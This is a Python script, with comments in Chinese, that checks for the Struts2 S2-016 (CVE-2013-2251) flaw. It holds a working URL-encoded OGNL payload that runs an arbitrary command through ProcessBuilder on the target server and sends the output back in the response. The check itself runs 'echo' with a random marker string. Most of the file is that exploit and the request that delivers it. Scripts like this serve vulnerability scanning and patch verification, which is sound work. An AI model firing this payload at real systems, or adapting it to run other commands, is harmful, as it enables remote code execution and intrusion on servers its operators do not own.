#!/usr/bin/env python3

import shlex
import random
import string
import urllib
import requests

class S2_016_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'Struts2 S2-016漏洞,又名CVE-2013-2251漏洞',
            'description': 'Struts2 S2-016漏洞可执行任意命令,影响范围为: Struts 2.0.0 - Struts 2.3.15',
            'date': '2013-06-03',
            'type': 'RCE'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        if '.action' not in self.url:
            self.url = self.url + '/index.action'
        self.capta = self.get_capta() 
        self.headers = {
            'User-Agent': "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36 115Browser/6.0.3",
            'Content-Type': "application/x-www-form-urlencoded",
            'Connection': "keep-alive",
        }
        self.payload = '''?redirect%3A%24%7B%23a%3D(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%20%7B{cmd}%7D)).start()%2C%23b%3D%23a.getInputStream()%2C%23c%3Dnew%20java.io.InputStreamReader%20(%23b)%2C%23d%3Dnew%20java.io.BufferedReader(%23c)%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read(%23e)%2C%23matt%3D%20%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse')%2C%23matt.getWriter().println%20(%23e)%2C%23matt.getWriter().flush()%2C%23matt.getWriter().close()%7D'''
   
    def get_capta(self):
        
        """
        获取一个随机字符串

        :param:

        :return str capta: 生成的字符串
        """

        capta = ''
        words = ''.join((string.ascii_letters,string.digits))
        for i in range(8):
            capta = capta + random.choice(words)
        return capta
    
    def filter(self, check_str):

        """
        过滤无用字符

        :param str check_str:待过滤的字符串

        :return str temp:过滤后的字符串
        """
        
        temp = ''
        for i in check_str:
            if i != '\n' and i != '\x00':
                temp = temp + i
        return temp   
    
    def parser_cmd(self, cmd):

        """
        命令解析,将要执行的命令解析为字符串格式,如echo 123 解析为"echo", "123"

        :param str cmd: 待解析的命令

        :return: cmd_str 解析后的字符串
        """

        cmd = shlex.split(cmd)
        cmd_str = '"' + '","'.join(cmd) + '"'
        return cmd_str

    def run(self):

        """
        检测是否存在漏洞

        :param:

        :return str True or False
        """

        check_req = requests.get(self.url + self.payload.format(cmd = urllib.parse.quote(self.parser_cmd('echo' + ' ' + self.capta) )), headers = self.headers)
        check_str = self.filter(list(check_req.text))
        try:
            if self.capta in check_str and len(check_str) < 100:
                return True
            else:
                return False
        except Exception as e:
            print(e)
            return False
        finally:
            pass

if  __name__ == "__main__":
    s2_016 = S2_016_BaseVerify('http://localhost:8080/s2_016_war_exploded/')
    print(s2_016.run())